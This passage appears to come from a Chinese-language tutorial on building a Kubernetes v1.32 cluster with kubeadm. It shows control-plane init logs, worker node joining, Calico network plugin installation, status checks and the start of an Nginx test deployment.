20:09:29.607888    4886 manifests.go:104] [control-plane] getting StaticPodSpecs\nI0322 20:09:29.608085    4886 certs.go:473] validating certificate period for CA certificate\nI0322 20:09:29.608178    4886 manifests.go:130] [control-plane] adding volume \"ca-certs\" for component \"kube-apiserver\"\nI0322 20:09:29.608192    4886 manifests.go:130] [control-plane] adding volume \"etc-ca-certificates\" for component \"kube-apiserver\"\nI0322 20:09:29.608198    4886 manifests.go:130] [control-plane] adding volume \"k8s-certs\" for component \"kube-apiserver\"\nI0322 20:09:29.608206    4886 manifests.go:130] [control-plane] adding volume \"usr-local-share-ca-certificates\" for component \"kube-apiserver\"\nI0322 20:09:29.608214    4886 manifests.go:130] [control-plane] adding volume \"usr-share-ca-certificates\" for component \"kube-apiserver\"\nI0322 20:09:29.609567    4886 manifests.go:159] [control-plane] wrote static Pod manifest for component \"kube-apiserver\" to \"/etc/kubernetes/manifests/kube-apiserver.yaml\"\n[control-plane] Creating static Pod manifest for \"kube-controller-manager\"\nI0322 20:09:29.609599    4886 manifests.go:104] [control-plane] getting StaticPodSpecs\nI0322 20:09:29.609807    4886 manifests.go:130] [control-plane] adding volume \"ca-certs\" for component \"kube-controller-manager\"\nI0322 20:09:29.609819    4886 manifests.go:130] [control-plane] adding volume \"etc-ca-certificates\" for component \"kube-controller-manager\"\nI0322 20:09:29.609824    4886 manifests.go:130] [control-plane] adding volume \"flexvolume-dir\" for component \"kube-controller-manager\"\nI0322 20:09:29.609835    4886 manifests.go:130] [control-plane] adding volume \"k8s-certs\" for component \"kube-controller-manager\"\nI0322 20:09:29.609841    4886 manifests.go:130] [control-plane] adding volume \"kubeconfig\" for component \"kube-controller-manager\"\nI0322 20:09:29.609846    4886 manifests.go:130] [control-plane] adding volume \"usr-local-share-ca-certificates\" for component \"kube-controller-manager\"\nI0322 20:09:29.609854    4886 manifests.go:130] [control-plane] adding volume \"usr-share-ca-certificates\" for component \"kube-controller-manager\"\nI0322 20:09:29.610610    4886 manifests.go:159] [control-plane] wrote static Pod manifest for component \"kube-controller-manager\" to \"/etc/kubernetes/manifests/kube-controller-manager.yaml\"\n[control-plane] Creating static Pod manifest for \"kube-scheduler\"\nI0322 20:09:29.610640    4886 manifests.go:104] [control-plane] getting StaticPodSpecs\nI0322 20:09:29.610848    4886 manifests.go:130] [control-plane] adding volume \"kubeconfig\" for component \"kube-scheduler\"\nI0322 20:09:29.611322    4886 manifests.go:159] [control-plane] wrote static Pod manifest for component \"kube-scheduler\" to \"/etc/kubernetes/manifests/kube-scheduler.yaml\"\nI0322 20:09:29.611339    4886 kubelet.go:70] Stopping the kubelet\n[kubelet-start] Writing kubelet environment file with flags to file \"/var/lib/kubelet/kubeadm-flags.env\"\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[kubelet-start] Starting the kubelet\nI0322 20:09:29.948568    4886 loader.go:402] Config loaded from file:  /etc/kubernetes/admin.conf\nI0322 20:09:29.949088    4886 envvar.go:172] \"Feature gate default state\" feature=\"ClientsAllowCBOR\" enabled=false\nI0322 20:09:29.949115    4886 envvar.go:172] \"Feature gate default state\" feature=\"ClientsPreferCBOR\" enabled=false\nI0322 20:09:29.949124    4886 envvar.go:172] \"Feature gate default state\" feature=\"InformerResourceVersion\" enabled=false\nI0322 20:09:29.949144    4886 envvar.go:172] \"Feature gate default state\" feature=\"WatchListClient\" enabled=false\n[wait-control-plane] Waiting for the kubelet to boot up the control plane as static Pods from directory \"/etc/kubernetes/manifests\"\n[kubelet-check] Waiting for a healthy kubelet at http://127.0.0.1:10248/healthz. This can take up to 4m0s\n[kubelet-check] The kubelet is healthy after 502.456949ms\n[api-check] Waiting for a healthy API server. This can take up to 4m0s\nI0322 20:09:30.452200    4886 wait.go:220] \"Request Body\" body=\"\"\nI0322 20:09:30.452302    4886 round_trippers.go:473] curl -v -XGET  -H \"Accept: application/json, */*\" -H \"User-Agent: kubeadm/v1.32.3 (linux/amd64) kubernetes/32cc146\" 'https://192.168.11.161:6443/healthz?timeout=10s'\nI0322 20:09:30.452515    4886 round_trippers.go:515] HTTP Trace: Dial to tcp:192.168.11.161:6443 failed: dial tcp 192.168.11.161:6443: connect: connection refused\nI0322 20:09:30.452547    4886 round_trippers.go:560] GET https://192.168.11.161:6443/healthz?timeout=10s  in 0 milliseconds\nI0322 20:09:30.452664    4886 round_trippers.go:577] HTTP Statistics: DNSLookup 0 ms Dial 0 ms TLSHandshake 0 ms Duration 0 ms\nI0322 20:09:30.452746    4886 round_trippers.go:584] Response Headers:\nI0322 20:09:30.952488    4886 wait.go:220] \"Request Body\" body=\"\"\nI0322 20:09:30.952695    4886 round_trippers.go:473] curl -v -XGET  -H \"Accept: application/json, */*\" -H \"User-Agent: kubeadm/v1.32.3 (linux/amd64) kubernetes/32cc146\" 'https://192.168.11.161:6443/healthz?timeout=10s'\nI0322 20:09:30.953055    4886 round_trippers.go:515] HTTP Trace: Dial to tcp:192.168.11.161:6443 failed: dial tcp 192.168.11.161:6443: connect: connection refused\nI0322 20:09:30.953141    4886 round_trippers.go:560] GET https://192.168.11.161:6443/healthz?timeout=10s  in 0 milliseconds\nI0322 20:09:30.953178    4886 round_trippers.go:577] HTTP Statistics: DNSLookup 0 ms Dial 0 ms TLSHandshake 0 ms Duration 0 ms\nI0322 20:09:30.953196    4886 round_trippers.go:584] Response Headers:\nI0322 20:09:31.453072    4886 wait.go:220] \"Request Body\" body=\"\"\nI0322 20:09:31.453425    4886 round_trippers.go:473] curl -v -XGET  -H \"Accept: application/json, */*\" -H \"User-Agent: kubeadm/v1.32.3 (linux/amd64) kubernetes/32cc146\" 'https://192.168.11.161:6443/healthz?timeout=10s'\nI0322 20:09:31.453892    4886 round_trippers.go:515] HTTP Trace: Dial to tcp:192.168.11.161:6443 failed: dial tcp 192.168.11.161:6443: connect: connection refused\nI0322 20:09:31.453935    4886 round_trippers.go:560] GET https://192.168.11.161:6443/healthz?timeout=10s  in 0 milliseconds\nI0322 20:09:31.453947    4886 round_trippers.go:577] HTTP Statistics: DNSLookup 0 ms Dial 0 ms TLSHandshake 0 ms Duration 0 ms\nI0322 20:09:31.453955    4886 round_trippers.go:584] Response Headers:\nI0322 20:09:31.952836    4886 wait.go:220] \"Request Body\" body=\"\"\nI0322 20:09:31.953094    4886 round_trippers.go:473] curl -v -XGET  -H \"Accept: application/json, */*\" -H \"User-Agent: kubeadm/v1.32.3 (linux/amd64) kubernetes/32cc146\" 'https://192.168.11.161:6443/healthz?timeout=10s'\nI0322 20:09:31.953553    4886 round_trippers.go:517] HTTP Trace: Dial to tcp:192.168.11.161:6443 succeed\nI0322 20:09:33.315605    4886 round_trippers.go:560] GET https://192.168.11.161:6443/healthz?timeout=10s 403 Forbidden in 1362 milliseconds\nI0322 20:09:33.315644    4886 round_trippers.go:577] HTTP Statistics: DNSLookup 0 ms Dial 0 ms TLSHandshake 1336 ms ServerProcessing 25 ms Duration 1362 ms\nI0322 20:09:33.315657    4886 round_trippers.go:584] Response Headers:\nI0322 20:09:33.315670    4886 round_trippers.go:587]     X-Content-Type-Options: nosniff\nI0322 20:09:33.315701    4886 round_trippers.go:587]     X-Kubernetes-Pf-Flowschema-Uid: \nI0322 20:09:33.315710    4886 round_trippers.go:587]     X-Kubernetes-Pf-Prioritylevel-Uid: \nI0322 20:09:33.315717    4886 round_trippers.go:587]     Content-Length: 192\nI0322 20:09:33.315723    4886 round_trippers.go:587]     Date: Sat, 22 Mar 2025 12:09:33 GMT\nI0322 20:09:33.315731    4886 round_trippers.go:587]     Audit-Id: 989b38d0-29d4-4450-b564-12e6142c52b7\nI0322 20:09:33.315737    4886 round_trippers.go:587]     Cache-Control: no-cache, private\nI0322 20:09:33.315741    4886 round_trippers.go:587]     Content-Type: application/json\nI0322 20:09:33.316997    4886 wait.go:220] \"Response Body\" body=&lt;\n    {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \\\"kubernetes-admin\\\" cannot get path \\\"/healthz\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n &gt;\n\n.......   \u200b\u4e2d\u95f4\u200b\u5197\u957f\u200b\u7684\u200b\u65e5\u5fd7\u200b\u7701\u7565\u200b\n\nI0322 20:09:37.294961    4886 round_trippers.go:473] curl -v -XPOST  -H \"User-Agent: kubeadm/v1.32.3 (linux/amd64) kubernetes/32cc146\" -H \"Accept: application/vnd.kubernetes.protobuf,application/json\" -H \"Content-Type: application/vnd.kubernetes.protobuf\" 'https://192.168.11.161:6443/apis/rbac.authorization.k8s.io/v1/namespaces/kube-system/rolebindings?timeout=10s'\nI0322 20:09:37.298583    4886 round_trippers.go:560] POST https://192.168.11.161:6443/apis/rbac.authorization.k8s.io/v1/namespaces/kube-system/rolebindings?timeout=10s 201 Created in 3 milliseconds\nI0322 20:09:37.298609    4886 round_trippers.go:577] HTTP Statistics: GetConnection 0 ms ServerProcessing 3 ms Duration 3 ms\nI0322 20:09:37.298634    4886 round_trippers.go:584] Response Headers:\nI0322 20:09:37.298649    4886 round_trippers.go:587]     X-Kubernetes-Pf-Flowschema-Uid: 9a8a526f-0630-4d03-b851-7ace48e8dc05\nI0322 20:09:37.298661    4886 round_trippers.go:587]     X-Kubernetes-Pf-Prioritylevel-Uid: d044472a-2a80-46df-8bc8-7d94366f6e34\nI0322 20:09:37.298667    4886 round_trippers.go:587]     Content-Length: 385\nI0322 20:09:37.298675    4886 round_trippers.go:587]     Date: Sat, 22 Mar 2025 12:09:37 GMT\nI0322 20:09:37.298680    4886 round_trippers.go:587]     Audit-Id: ece06481-523b-4fe4-9d2c-2d369eceecc1\nI0322 20:09:37.298690    4886 round_trippers.go:587]     Cache-Control: no-cache, private\nI0322 20:09:37.298695    4886 round_trippers.go:587]     Content-Type: application/vnd.kubernetes.protobuf\nI0322 20:09:37.298744    4886 type.go:252] \"Response Body\" body=&lt;\n    00000000  6b 38 73 00 0a 2b 0a 1c  72 62 61 63 2e 61 75 74  |k8s..+..rbac.aut|\n    00000010  68 6f 72 69 7a 61 74 69  6f 6e 2e 6b 38 73 2e 69  |horization.k8s.i|\n    00000020  6f 2f 76 31 12 0b 52 6f  6c 65 42 69 6e 64 69 6e  |o/v1..RoleBindin|\n    00000030  67 12 c9 02 0a c0 01 0a  0a 6b 75 62 65 2d 70 72  |g........kube-pr|\n    00000040  6f 78 79 12 00 1a 0b 6b  75 62 65 2d 73 79 73 74  |oxy....kube-syst|\n    00000050  65 6d 22 00 2a 24 63 38  62 62 36 66 63 64 2d 38  |em\".*$c8bb6fcd-8|\n    00000060  66 35 38 2d 34 35 35 34  2d 39 66 36 30 2d 38 39  |f58-4554-9f60-89|\n    00000070  39 32 61 39 65 36 64 36  64 39 32 03 33 30 33 38  |92a9e6d6d92.3038|\n    00000080  00 42 08 08 81 d1 fa be  06 10 00 8a 01 69 0a 07  |.B...........i..|\n    00000090  6b 75 62 65 61 64 6d 12  06 55 70 64 61 74 65 1a  |kubeadm..Update.|\n    000000a0  1c 72 62 61 63 2e 61 75  74 68 6f 72 69 7a 61 74  |.rbac.authorizat|\n    000000b0  69 6f 6e 2e 6b 38 73 2e  69 6f 2f 76 31 22 08 08  |ion.k8s.io/v1\"..|\n    000000c0  81 d1 fa be 06 10 00 32  08 46 69 65 6c 64 73 56  |.......2.FieldsV|\n    000000d0  31 3a 22 0a 20 7b 22 66  3a 72 6f 6c 65 52 65 66  |1:\". {\"f:roleRef|\n    000000e0  22 3a 7b 7d 2c 22 66 3a  73 75 62 6a 65 63 74 73  |\":{},\"f:subjects|\n    000000f0  22 3a 7b 7d 7d 42 00 12  55 0a 05 47 72 6f 75 70  |\":{}}B..U..Group|\n    00000100  12 19 72 62 61 63 2e 61  75 74 68 6f 72 69 7a 61  |..rbac.authoriza|\n    00000110  74 69 6f 6e 2e 6b 38 73  2e 69 6f 1a 2f 73 79 73  |tion.k8s.io./sys|\n    00000120  74 65 6d 3a 62 6f 6f 74  73 74 72 61 70 70 65 72  |tem:bootstrapper|\n    00000130  73 3a 6b 75 62 65 61 64  6d 3a 64 65 66 61 75 6c  |s:kubeadm:defaul|\n    00000140  74 2d 6e 6f 64 65 2d 74  6f 6b 65 6e 22 00 1a 2d  |t-node-token\"..-|\n    00000150  0a 19 72 62 61 63 2e 61  75 74 68 6f 72 69 7a 61  |..rbac.authoriza|\n    00000160  74 69 6f 6e 2e 6b 38 73  2e 69 6f 12 04 52 6f 6c  |tion.k8s.io..Rol|\n    00000170  65 1a 0a 6b 75 62 65 2d  70 72 6f 78 79 1a 00 22  |e..kube-proxy..\"|\n    00000180  00                                                |.|\n &gt;\n[addons] Applied essential addon: kube-proxy\nI0322 20:09:37.299409    4886 loader.go:402] Config loaded from file:  /etc/kubernetes/admin.conf\nI0322 20:09:37.300120    4886 loader.go:402] Config loaded from file:  /etc/kubernetes/admin.conf\n\nYour Kubernetes control-plane has initialized successfully!\n\nTo start using your cluster, you need to run the following as a regular user:\n\n  mkdir -p $HOME/.kube\n  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\n  sudo chown $(id -u):$(id -g) $HOME/.kube/config\n\nAlternatively, if you are the root user, you can run:\n\n  export KUBECONFIG=/etc/kubernetes/admin.conf\n\nYou should now deploy a pod network to the cluster.\nRun \"kubectl apply -f [podnetwork].yaml\" with one of the options listed at:\n  https://kubernetes.io/docs/concepts/cluster-administration/addons/\n\nThen you can join any number of worker nodes by running the following on each as root:\n\nkubeadm join 192.168.11.161:6443 --token abcdef.0123456789abcdef \\\n    --discovery-token-ca-cert-hash sha256:c7a1d928a82c30bec6dec880092339e64309b24cc01782d8a9d9c6c0ecfde58f \n</code></pre>"},{"location":"3/2/#34-kubectl","title":"3.4 \u200b\u51c6\u5907\u200bkubectl\u200b\u914d\u7f6e\u6587\u4ef6","text":"<p>\u200b\u4ee5\u4e0b\u200b\u64cd\u4f5c\u200b\u4ec5\u200b\u5728\u200bMaster\u200b\u8282\u70b9\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u3002</p> Bash<pre><code>mkdir -p $HOME/.kube\nsudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\nsudo chown $(id -u):$(id -g) $HOME/.kube/config\n</code></pre>"},{"location":"3/2/#35","title":"3.5 \u200b\u5de5\u4f5c\u200b\u8282\u70b9\u200b\u52a0\u5165\u200b\u96c6\u7fa4","text":""},{"location":"3/2/#k8s-worker01","title":"k8s-worker01\u200b\u8282\u70b9\u200b\u52a0\u5165\u200b\u96c6\u7fa4","text":"<p>\u200b\u4ee5\u4e0b\u200b\u64cd\u4f5c\u200b\u4ec5\u200b\u5728\u200bWorker\u200b\u8282\u70b9\u200b\u64cd\u4f5c\u200b</p> Bash<pre><code>root@k8s-worker01:~# kubeadm join 192.168.11.161:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:c7a1d928a82c30bec6dec880092339e64309b24cc01782d8a9d9c6c0ecfde58f \n</code></pre>"},{"location":"3/2/#k8s-worker02","title":"k8s-worker02\u200b\u8282\u70b9\u200b\u52a0\u5165\u200b\u96c6\u7fa4","text":"<p>\u200b\u4ee5\u4e0b\u200b\u64cd\u4f5c\u200b\u4ec5\u200b\u5728\u200bWorker\u200b\u8282\u70b9\u200b\u64cd\u4f5c\u200b</p> Bash<pre><code>root@k8s-worker02:~# kubeadm join 192.168.11.161:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:c7a1d928a82c30bec6dec880092339e64309b24cc01782d8a9d9c6c0ecfde58f\n</code></pre>"},{"location":"3/2/#36-k8s","title":"3.6 \u200b\u9a8c\u8bc1\u200bK8S\u200b\u96c6\u7fa4\u200b\u8282\u70b9\u200b\u662f\u5426\u200b\u53ef\u7528","text":"<p>\u200b\u5728\u200bMaster\u200b\u8282\u70b9\u200b\u68c0\u67e5\u200b\u96c6\u7fa4\u200b\u8282\u70b9\u200b\u662f\u5426\u200b\u53ef\u7528\u200b </p> Bash<pre><code>root@k8s-master01:~# kubectl get nodes\n\nNAME           STATUS     ROLES           AGE     VERSION\nk8s-master01   NotReady   control-plane   103m    v1.32.3\nk8s-worker01   NotReady   &lt;none&gt;          4m12s   v1.32.3\nk8s-worker02   NotReady   &lt;none&gt;          4m12s   v1.32.3\n</code></pre> <p>\u200b\u5728\u200bMaster\u200b\u8282\u70b9\u200b\u68c0\u67e5\u200b\u96c6\u7fa4\u200bPod\u200b\u72b6\u6001\u200b\uff08\u200b\u6309\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u7b5b\u9009\u200b\uff09 </p> Bash<pre><code>root@k8s-master01:~# kubectl get pods -n kube-system\n\nNAME                                   READY   STATUS    RESTARTS   AGE\ncoredns-6766b7b6bb-6dtl7               0/1     Pending   0          104m\ncoredns-6766b7b6bb-lrpw7               0/1     Pending   0          104m\netcd-k8s-master01                      1/1     Running   0          104m      // \u200b\u9759\u6001\u200bpod\nkube-apiserver-k8s-master01            1/1     Running   0          104m      // \u200b\u9759\u6001\u200bpod\nkube-controller-manager-k8s-master01   1/1     Running   0          104m      // \u200b\u9759\u6001\u200bpod    \nkube-proxy-6g8dn                       1/1     Running   0          104m      \nkube-proxy-kmzv6                       1/1     Running   0          5m1s\nkube-proxy-pj2t5                       1/1     Running   0          5m1s\nkube-scheduler-k8s-master01            1/1     Running   0          104m      // \u200b\u9759\u6001\u200bpod \n</code></pre> <p>\u200b\u67e5\u770b\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b</p> Bash<pre><code>root@k8s-master01:~# kubectl get cs\n\nWarning: v1 ComponentStatus is deprecated in v1.19+\nNAME                 STATUS    MESSAGE   ERROR\netcd-0               Healthy   ok        \nscheduler            Healthy   ok        \ncontroller-manager   Healthy   ok  \n</code></pre>"},{"location":"3/2/#k8scalico","title":"\u56db\u200b\u3001K8S\u200b\u96c6\u7fa4\u200b\u7f51\u7edc\u200b\u63d2\u4ef6\u200bcalico\u200b\u90e8\u7f72","text":"<p>calico\u200b\u7f51\u7edc\u200b\u63d2\u4ef6\u200b</p>"},{"location":"3/2/#41-tigera-operator","title":"4.1 \u200b\u7b2c\u4e00\u6b65\u200b\uff1a\u200b\u5b89\u88c5\u200btigera-operator","text":"Bash<pre><code>root@k8s-master01:~# kubectl create -f https://raw.githubusercontent.com/projectcalico/calico/v3.29.2/manifests/tigera-operator.yaml\n</code></pre>"},{"location":"3/2/#411","title":"4.1.1 \u200b\u8f93\u51fa\u200b\u5185\u5bb9\u200b\uff1a","text":"Bash<pre><code>root@k8s-master01:~# kubectl create -f https://raw.githubusercontent.com/projectcalico/calico/v3.29.2/manifests/tigera-operator.yaml\n\nnamespace/tigera-operator created\ncustomresourcedefinition.apiextensions.k8s.io/bgpconfigurations.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/bgpfilters.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/bgppeers.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/blockaffinities.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/caliconodestatuses.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/clusterinformations.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/felixconfigurations.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/globalnetworkpolicies.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/globalnetworksets.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/hostendpoints.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/ipamblocks.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/ipamconfigs.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/ipamhandles.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/ippools.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/ipreservations.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/kubecontrollersconfigurations.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/networkpolicies.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/networksets.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/tiers.crd.projectcalico.org created\ncustomresourcedefinition.apiextensions.k8s.io/adminnetworkpolicies.policy.networking.k8s.io created\ncustomresourcedefinition.apiextensions.k8s.io/apiservers.operator.tigera.io created\ncustomresourcedefinition.apiextensions.k8s.io/imagesets.operator.tigera.io created\ncustomresourcedefinition.apiextensions.k8s.io/installations.operator.tigera.io created\ncustomresourcedefinition.apiextensions.k8s.io/tigerastatuses.operator.tigera.io created\nserviceaccount/tigera-operator created\nclusterrole.rbac.authorization.k8s.io/tigera-operator created\nclusterrolebinding.rbac.authorization.k8s.io/tigera-operator created\ndeployment.apps/tigera-operator created\n</code></pre> Bash<pre><code>root@k8s-master01:~# kubectl get ns\n\nNAME              STATUS   AGE\ndefault           Active   116m\nkube-node-lease   Active   116m\nkube-public       Active   116m\nkube-system       Active   116m\ntigera-operator   Active   106s      // \u200b\u65b0\u589e\u200b\u7684\u200bpod\n</code></pre> Bash<pre><code>root@k8s-master01:~# kubectl get pods -n tigera-operator\n\nNAME                              READY   STATUS             RESTARTS   AGE\ntigera-operator-ccfc44587-vswlt   0/1     ImagePullBackOff   0          3m44s\n</code></pre>"},{"location":"3/2/#42-calico-system","title":"4.2 \u200b\u7b2c\u4e8c\u6b65\u200b\uff1a\u200b\u5b89\u88c5\u200bcalico-system","text":""},{"location":"3/2/#421-custom-resourcesyaml","title":"4.2.1 \u200b\u4e0b\u8f7d\u200bcustom-resources.yaml","text":"Bash<pre><code>~# wget https://raw.githubusercontent.com/projectcalico/calico/v3.29.2/manifests/custom-resources.yaml\n</code></pre>"},{"location":"3/2/#422-custom-resourcesyamlcidr","title":"4.2.2 \u200b\u4fee\u6539\u200bcustom-resources.yaml\u200b\u4e2d\u200b\u7684\u200b\u7f51\u6bb5\u200bcidr\u200b\u914d\u7f6e","text":"Bash<pre><code>~# nano custom-resources.yaml\n</code></pre> YAML<pre><code># This section includes base Calico installation configuration.\n# For more information, see: https://projectcalico.docs.tigera.io/master/reference/installation/api#operator.tigera.io/v1.Installation\n apiVersion: operator.tigera.io/v1\n kind: Installation\n metadata:\n  name: default\n spec:\n  # Configures Calico networking.\n  calicoNetwork:\n    # Note: The ipPools section cannot be modified post-install.\n    ipPools:\n    - blockSize: 26\n      cidr: 10.244.0.0/16                # \u200b\u4fee\u6539\u200b\u6b64\u884c\u200b\u5185\u5bb9\u200b\u4e3a\u200b\u521d\u59cb\u5316\u200b\u65f6\u200b\u5b9a\u4e49\u200b\u7684\u200bpod network cidr\n      encapsulation: VXLANCrossSubnet\n      natOutgoing: Enabled\n      nodeSelector: all()\n\n---\n# This section configures the Calico API server.\n# For more information, see: https://projectcalico.docs.tigera.io/master/reference/installation/api#operator.tigera.io/v1.APIServer\napiVersion: operator.tigera.io/v1\nkind: APIServer\nmetadata:\n  name: default\n spec: {}\n</code></pre> <ul> <li>\u200b\u518d\u6b21\u200b\u68c0\u67e5\u200b\u4fee\u6539\u200b\u540e\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b</li> </ul> Bash<pre><code>~# cat custom-resources.yaml\n</code></pre>"},{"location":"3/2/#423","title":"4.2.3 \u200b\u5e94\u7528\u200b\u90e8\u7f72\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u8fdb\u884c\u200b\u90e8\u7f72","text":"Bash<pre><code>root@k8s-master01:~# kubectl create -f custom-resources.yaml\n\ninstallation.operator.tigera.io/default created\napiserver.operator.tigera.io/default created\n</code></pre>"},{"location":"3/2/#424-calico","title":"4.2.4 \u200b\u68c0\u67e5\u200bcalico\u200b\u5b89\u88c5\u200b\u7ed3\u679c","text":"Bash<pre><code>root@k8s-master01:~# watch kubectl get pods -n calico-system\n</code></pre> <p>\u200b\u7ecf\u8fc7\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u7684\u200b\u4e0b\u8f7d\u5b89\u88c5\u200b\uff0c\u200b\u5168\u200b\u90e8\u7f72\u200b\u5b8c\u6210\u200b\u540e\u200b\u5927\u81f4\u200b\u5982\u4e0b\u200b\u8f93\u51fa\u200b\u6240\u793a\u200b\uff1a</p> Bash<pre><code>root@k8s-master01:~# kubectl get pods -n calico-system\n\nNAME                                      READY   STATUS    RESTARTS   AGE\ncalico-kube-controllers-cf49d8944-6zv2z   1/1     Running   0          53m\ncalico-node-2nfvf                         1/1     Running   0          53m\ncalico-node-nxhvj                         1/1     Running   0          53m\ncalico-node-v9lp9                         1/1     Running   0          53m\ncalico-typha-7b6f98bc78-49bf5             1/1     Running   0          53m\ncalico-typha-7b6f98bc78-7vhd6             1/1     Running   0          53m\ncsi-node-driver-6nbvr                     2/2     Running   0          53m\ncsi-node-driver-9cqq5                     2/2     Running   0          53m\ncsi-node-driver-9pm4t                     2/2     Running   0          53m   \n</code></pre> <p>\u200b\u67e5\u770b\u200b\u8282\u70b9\u200b\u72b6\u6001\u200b\u53d8\u5316\u200b\uff1a</p> Bash<pre><code>root@k8s-master01:~# kubectl get nodes\n\nNAME           STATUS   ROLES           AGE     VERSION\nk8s-master01   Ready    control-plane   3h40m   v1.32.3\nk8s-worker01   Ready    &lt;none&gt;          121m    v1.32.3\nk8s-worker02   Ready    &lt;none&gt;          121m    v1.32.3\n</code></pre> <p>\u200b\u67e5\u770b\u200bpod\u200b\u72b6\u6001\u200b</p> Bash<pre><code>root@k8s-master01:~# kubectl get pods -n kube-system\n\nNAME                                   READY   STATUS    RESTARTS   AGE\ncoredns-6766b7b6bb-6dtl7               1/1     Running   0          3h42m\ncoredns-6766b7b6bb-lrpw7               1/1     Running   0          3h42m\netcd-k8s-master01                      1/1     Running   0          3h42m\nkube-apiserver-k8s-master01            1/1     Running   0          3h42m\nkube-controller-manager-k8s-master01   1/1     Running   0          3h42m\nkube-proxy-6g8dn                       1/1     Running   0          3h42m\nkube-proxy-kmzv6                       1/1     Running   0          122m\nkube-proxy-pj2t5                       1/1     Running   0          122m\nkube-scheduler-k8s-master01            1/1     Running   0          3h42m\n</code></pre> <p>\u200b\u67e5\u770b\u200bpod\u200b\u7684\u200bIP\u200b\u53ca\u200b\u7f51\u6bb5\u200b</p> Bash<pre><code>root@k8s-master01:~# kubectl get pods -n kube-system -o wide\n\nNAME                                   READY   STATUS    RESTARTS   AGE     IP               NODE           NOMINATED NODE   READINESS GATES\ncoredns-6766b7b6bb-6dtl7               1/1     Running   0          3h43m   10.244.69.198    k8s-worker02   &lt;none&gt;           &lt;none&gt;\ncoredns-6766b7b6bb-lrpw7               1/1     Running   0          3h43m   10.244.69.197    k8s-worker02   &lt;none&gt;           &lt;none&gt;\netcd-k8s-master01                      1/1     Running   0          3h44m   192.168.11.161   k8s-master01   &lt;none&gt;           &lt;none&gt;\nkube-apiserver-k8s-master01            1/1     Running   0          3h44m   192.168.11.161   k8s-master01   &lt;none&gt;           &lt;none&gt;\nkube-controller-manager-k8s-master01   1/1     Running   0          3h44m   192.168.11.161   k8s-master01   &lt;none&gt;           &lt;none&gt;\nkube-proxy-6g8dn                       1/1     Running   0          3h43m   192.168.11.161   k8s-master01   &lt;none&gt;           &lt;none&gt;\nkube-proxy-kmzv6                       1/1     Running   0          124m    192.168.11.165   k8s-worker01   &lt;none&gt;           &lt;none&gt;\nkube-proxy-pj2t5                       1/1     Running   0          124m    192.168.11.166   k8s-worker02   &lt;none&gt;           &lt;none&gt;\nkube-scheduler-k8s-master01            1/1     Running   0          3h44m   192.168.11.161   k8s-master01   &lt;none&gt;           &lt;none&gt;\n</code></pre>"},{"location":"3/2/#nginxk8s","title":"\u4e94\u200b\u3001\u200b\u90e8\u7f72\u200bNginx\u200b\u5e94\u7528\u200b\u9a8c\u8bc1\u200bK8S\u200b\u96c6\u7fa4\u200b\u53ef\u7528\u6027","text":"<p>\u200b\u672c\u7ae0\u200b\u4ee5\u200bNginx\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5148\u200b\u6dfb\u52a0\u200bnginx\u200b\u5e94\u7528\u200b\u914d\u7f6e\u6587\u4ef6\u200bnginx.yaml\uff0c\u200b\u518d\u200b\u6dfb\u52a0\u200b\u76f8\u5173\u200b\u5e94\u7528\u200b\u914d\u7f6e\u200b</p>"},{"location":"3/2/#51-nginxwebnginx-websiteyaml","title":"5.1 \u200b\u914d\u7f6e\u200bNginxWeb\u200b\u90e8\u7f72\u200b\u914d\u7f6e\u6587\u4ef6\u200bnginx-website.yaml","text":"Bash<pre><code>root@k8s-master01:~# nano /home/acanx/nginx-website.yaml\n</code></pre> YAML<pre><code>---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginxweb\nspec:\n  selector:\n    matchLabels:\n      app: nginxwebsite\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: nginxwebsite\n    spec:\n      containers:\n      - name: nginxwebsite\n        image: nginx:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: nginxweb-service\nspec:\n  externalTrafficPolicy: Cluster\n  selector:\n    app: nginxwebsite\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 80\n    nodePort: 30080\n  type: NodePort\n</code></pre>"},{"location":"3/2/#52-nginx","title":"5.2 \u200b\u6267\u884c\u547d\u4ee4\u200b\u90e8\u7f72\u200bnginx\u200b\u670d\u52a1","text":"Bash<pre><code>root@k8s-master01:~# kubectl apply -f /home/acanx/nginx-website.yaml\n</code></pre> Text 